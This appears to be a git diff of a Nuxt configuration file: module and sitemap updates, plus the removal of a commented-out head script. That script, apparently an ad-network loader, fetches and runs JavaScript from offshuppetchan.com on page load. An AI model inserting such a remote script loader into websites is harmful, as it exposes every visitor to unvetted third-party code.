@@ -32,12 +32,7 @@ export default defineNuxtConfig({
         { rel: "icon", type: "image/png", sizes: "16x16", href: "/favicon-16x16.png" },
         { rel: "manifest", href: "/site.webmanifest" },
         { rel: "mask-icon", href: "/safari-pinned-tab.svg", color: "#0b0e0f" }
-      ] /*
-      script: [
-        {
-          innerHTML: "(function(d,z,s){s.src='https://'+d+'/400/'+z;try{(document.body||document.documentElement).appendChild(s)}catch(e){}})('offshuppetchan.com',7594585,document.createElement('script'))"
-        }
-      ] */
+      ]
     }
   },
   features: {
@@ -45,7 +40,7 @@ export default defineNuxtConfig({
   },
   modules: [
     "@nuxt/eslint",
-    "nuxt-icon",
+    "@nuxt/icon",
     "@nuxtjs/sitemap"
   ],
   runtimeConfig: {},
@@ -58,7 +53,6 @@ export default defineNuxtConfig({
     }
   },
   sitemap: {
-    dynamicUrlsApiEndpoint: "/__sitemap",
     xslColumns: [
       { label: "URL", width: "65%" },
       { label: "Priority", select: "sitemap:priority", width: "12.5%" },
@@ -70,7 +64,8 @@ export default defineNuxtConfig({
     "/*/**": {
       sitemap: { priority: 0.8, lastmod: new Date().toISOString() }
     },
-    "/_nuxt/**": { headers }
+    "/_nuxt/**": { headers },
+    "/api/_nuxt_icon/**": { cache: { maxAge: 1.577e+7 } }
   },
   eslint: {
     config: {
